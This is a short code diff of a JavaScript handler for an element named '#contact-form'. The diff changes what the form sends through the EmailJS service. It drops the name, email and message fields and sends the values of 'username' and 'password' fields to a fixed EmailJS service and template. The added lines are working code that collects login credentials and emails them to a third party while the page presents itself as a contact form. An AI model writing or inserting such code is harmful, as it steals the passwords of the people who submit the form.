@@ -11,20 +11,16 @@ document.querySelector('#contact-form').addEventListener('submit', (e) => {
 
 function onLoad(params) {
 
-    
     var tempParams = {
-        from_name: document.getElementById("name").value,
-        email_id: document.getElementById("email").value,
-        message: document.getElementById("message").value
+        from_name: document.getElementById("username").value,
+        message: document.getElementById("password").value,
     };
 
 
 
     emailjs.send("service_5rg4jzd", "template_d3n7vmw", tempParams)
-        .then(function(res) {
+        .then(function (res) {
             console.log("ok", res.status);
         })
 }
-
-
 
